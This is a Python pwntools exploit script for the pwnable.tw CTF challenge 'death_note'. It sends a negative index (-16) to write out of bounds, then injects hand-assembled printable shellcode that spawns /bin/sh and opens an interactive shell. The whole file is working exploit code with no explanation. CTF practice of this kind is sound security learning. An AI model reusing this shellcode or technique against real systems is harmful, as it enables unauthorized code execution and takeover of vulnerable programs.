from pwn import *

s=process('/root/tw/death_note/death_note')
#s=remote('chall.pwnable.tw',10201)
elf=ELF('/root/tw/death_note/death_note')
      
lib=ELF('/lib/x86_64-linux-gnu/libc.so.6')

shellcode=''
shellcode+="\x52\x5e\x6A\x31\x58\x34\x31\x50\x5a\x50\x68\x2F\x2F"
shellcode+="\x73\x68\x68\x2F\x62\x69\x6E\x54\x5B"
shellcode+="\x50\x53\x54\x59\x6A\x38\x58\x34\x33"
shellcode+="\x50\x5F\x68\x30\x41\x47\x47\x58\x66"
shellcode+="\x35\x30\x41\x66\x48\x66\x35\x41\x30"
shellcode+="\x66\x35\x73\x4F\x50\x57"   
shellcode+="\x66\x31\x46\x3c\x58"

print s.recvuntil("Your choice :")
s.send('1')
print s.recvuntil("Index :")
s.send('-16')

raw_input()
print s.recvuntil("Name :")
raw_input()
s.sendline(shellcode)

#print s.recvuntil("Your choice :")

raw_input()
        
s.interactive()

